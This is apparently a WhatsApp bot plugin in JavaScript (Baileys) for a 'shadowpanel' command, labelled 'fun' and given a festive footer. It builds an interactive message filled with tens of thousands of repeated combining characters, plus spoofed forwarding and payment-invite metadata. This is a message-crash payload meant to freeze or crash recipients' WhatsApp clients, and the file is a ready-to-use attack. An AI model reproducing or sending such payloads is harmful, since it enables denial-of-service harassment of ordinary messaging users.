import { generateWAMessageFromContent, prepareWAMessageMedia } from '@whiskeysockets/baileys'

let handler = async (m, { conn }) => {
  const bannerUrl = 'https://files.catbox.moe/r5f3xk.jpg' // imagen grande
  const miniaturaUrl = 'https://files.catbox.moe/r5f3xk.jpg' // imagen roja pequeña

  const media = await prepareWAMessageMedia({ image: { url: bannerUrl } }, { upload: conn.waUploadToServer })

  const cargaTexto = "i ᡃ⃝ᡃ⃝ᡃ⃝...".repeat(5000) + " ...".repeat(5000)

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            isForwarded: true,
            forwardingScore: 1973,
            businessMessageForwardInfo: {
              businessOwnerJid: conn.user.jid,
            },
            participant: conn.user.jid,
            remoteJid: "status@broadcast",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: "UPI",
                expiryTimestamp: Date.now(),
              },
            },
            thumbnail: await (await conn.getFile(miniaturaUrl)).data // miniatura roja
          },
          header: {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage,
          },
          body: {
            text: cargaTexto,
          },
          footer: {
            text: "⚔️ Shadow-BOT-MD • Panel navideño 🎄"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Canal Oficial 💚",
                  url: "https://www.whatsapp.com/android",
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Copiar Carga Interactiva",
                  id: "shadow-copy",
                  copy_code: cargaTexto
                }),
              },
            ],
          },
        },
      },
    },
  }

  const msg = generateWAMessageFromContent(m.chat, content, { userJid: m.sender })
  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}

handler.help = ['shadowpanel']
handler.tags = ['fun']
handler.command = ['shadowpanel']
handler.register = true

export default handler
